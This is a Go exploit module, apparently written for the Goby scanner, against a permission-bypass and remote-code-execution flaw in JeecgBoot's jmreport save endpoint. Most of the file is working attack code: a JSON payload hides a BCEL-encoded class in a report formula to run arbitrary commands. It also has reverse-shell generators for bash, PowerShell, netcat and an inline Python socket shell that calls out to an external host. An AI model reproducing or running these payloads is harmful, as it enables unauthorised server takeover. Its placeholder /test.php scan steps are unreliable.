package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "JEECGBOOT-Ent-Low-CP /save Code Execution Vulnerability",
    "Description": "<p>Jeecg Boot is an open-source enterprise-level rapid development platform based on code generators, focusing on the development of back-end management systems, enterprise information management systems (MIS) and other applications. It provides a range of tools and templates to help developers quickly build and deploy modern web applications.</p><p>JeecgBoot has a privilege bypass vulnerability, an unauthenticated remote attacker can construct jmLink, sharetoken parameters, or JmReport-Share-Token request headers to bypass permission authentication to access the backend interface, and further exploit it to achieve remote code execution, Trojan horse implantation, and server compromise.</p>",
    "Product": "JEECGBOOT-Ent-Low-CP",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2024-10-08",
    "PostTime": "2024-10-10",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") ||  (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "GobyQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") ||  (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "Level": "2",
    "Impact": "<p>JeecgBoot has a privilege bypass vulnerability, an unauthenticated remote attacker can construct jmLink, sharetoken parameters, or JmReport-Share-Token request headers to bypass permission authentication to access the backend interface, and further exploit it to achieve remote code execution, Trojan horse implantation, and server compromise.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142764211"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot /save 代码执行漏洞",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>Jeecg&nbsp;&nbsp;Boot是一款基于代码生成器的开源企业级快速开发平台，专注于开发后台管理系统、企业信息管理系统（MIS）等应用。它提供了一系列工具和模板，帮助开发者快速构建和部署现代化的 Web 应用程序。<br></p><p>JeecgBoot 存在权限绕过漏洞，未经身份验证的远程攻击者可构造jmLink、sharetoken参数或JmReport-Share-Token请求头绕过权限认证访问后台接口，进一步深入利用可实现远程代码执行、木马植入，导致服务器失陷等问题。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>JeecgBoot 存在权限绕过漏洞，未经身份验证的远程攻击者可构造jmLink、sharetoken参数或JmReport-Share-Token请求头绕过权限认证访问后台接口，进一步深入利用可实现远程代码执行、木马植入，导致服务器失陷等问题。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "JEECGBOOT-Ent-Low-CP /save Code Execution Vulnerability",
            "Product": "JEECGBOOT-Ent-Low-CP",
            "Description": "<p>Jeecg Boot is an open-source enterprise-level rapid development platform based on code generators, focusing on the development of back-end management systems, enterprise information management systems (MIS) and other applications. It provides a range of tools and templates to help developers quickly build and deploy modern web applications.</p><p>JeecgBoot has a privilege bypass vulnerability, an unauthenticated remote attacker can construct jmLink, sharetoken parameters, or JmReport-Share-Token request headers to bypass permission authentication to access the backend interface, and further exploit it to achieve remote code execution, Trojan horse implantation, and server compromise.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>JeecgBoot has a privilege bypass vulnerability, an unauthenticated remote attacker can construct jmLink, sharetoken parameters, or JmReport-Share-Token request headers to bypass permission authentication to access the backend interface, and further exploit it to achieve remote code execution, Trojan horse implantation, and server compromise.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
	setPayloadRequestHashcaischyuasgfgiasyhufeatyfgshdjasfdbedhdt := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL = "/jeecg-boot/jmreport/save?previousPage=1&jmLink=YWFhfHxiYm&shareToken=1&token=1"
		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		requestConfig.Header.Store("Content-Type", "application/json;charset=UTF-8")
		//将command中的"转化为'
		command = strings.Replace(command, "\"", "'", -1)
		requestConfig.Data = `{"designerObj":{"id":"123456","name":"test","type":"datainfo"},"name":"sheet1","freeze":"A1","freezeLineColor":"rgb(185, 185, 185)","styles":[],"displayConfig":{},"printConfig":{"paper":"A4","width":210,"height":297,"definition":1,"isBackend":false,"marginX":10,"marginY":10,"layout":"portrait","printCallBackUrl":""},"merges":[],"rows":{"0":{"cells":{"0":{"text":"=(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbN$c2$40$U$3d$D$a5$c5Z$FD$7c$r$s$ea$c6$c2$c2n$dca$dc$YLL$88$Y$n$eeK$bd$nC$da$vi$H$82$7f$a5$h5$$$fc$A$3f$cax$db$u$Q$t$99$fb89$e7$be$be$be$3f$3e$B$9c$e3$c0F$JU$h5le$a6na$dbBC$c0$bc$90J$eaK$81$a2$db$7c$Q0$ae$e2G$S$a8t$a5$a2$dbi4$a4d$e0$PCF$M$9aS$mp$eav$c7$fe$cc$f7B_$8d$bc$beN$a4$g$b5$9b$x$d0$5d$S$H$94$a6m$B$bb3$Ph$a2e$acR$L$3b$9c$f7$e3i$S$d0$b5$cc$aam$M$u$d5$9d$99$M$cf2$a9$D$T$96$85$5d$H$7b$d8w$60c$5d$e0$q$88$p$8f$e6$7e4$J$c9$8b$u$8a$93$t$c9$b1$af$b4$f7$a7$V$a8$$$h$f7$86c$K$b4$40$3d$87d$ec$dd$f4$W$D$I$d4$96$c4$fb$a9$d22$e2$Z$ec$R$e9E$d2pW$b7$f8$85$db8$86$c1g$cb$5e$B$o$9b$92m$99$b3C$f6$82$7d$a9$f5$G$f1$c2$81$c0$g$5b3$H$N$8ey$H$96d$d4$a3$5c$K$94$dfQh$bd$a2$f8$fc$8fm$c2$c95$7c$U$fe$9by$ab$ca$P$o$ZcR$b7$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()))+(c.exec(\"` + command + `\"));"}}},"len":100},"cols":{"len":50},"validations":[],"autofilter":{},"dbexps":[],"dicts":[],"loopBlockList":[],"zonedEditionList":[],"fixedPrintHeadRows":[],"fixedPrintTailRows":[],"rpbar":{"show":true,"pageSize":"","btnList":[]},"hiddenCells":[],"hidden":{"rows":[],"cols":[]},"background":false,"area":false,"dataRectWidth":0,"excel_config_id":"123456","pyGroupEngine":false,"querySetting":{"izOpenQueryBar":false,"izDefaultQuery":true}}`
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			ok = false
			return ok, vulURL, err
		}
		requestConfig.URI = "/jeecg-boot/jmreport/show?previousPage=1&jmLink=YWFhfHxiYm&shareToken=1&token=1"
		requestConfig.Data = `{"id":"123456"}`
		resp, err = httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			ok = false
			return ok, vulURL, err
		}
		ok = true
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashcaischyuasgfgiasyhufeatyfgshdjasfdbedhdt

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping -c 1 " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashcaischyuasgfgiasyhufeatyfgshdjasfdbedhdt

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
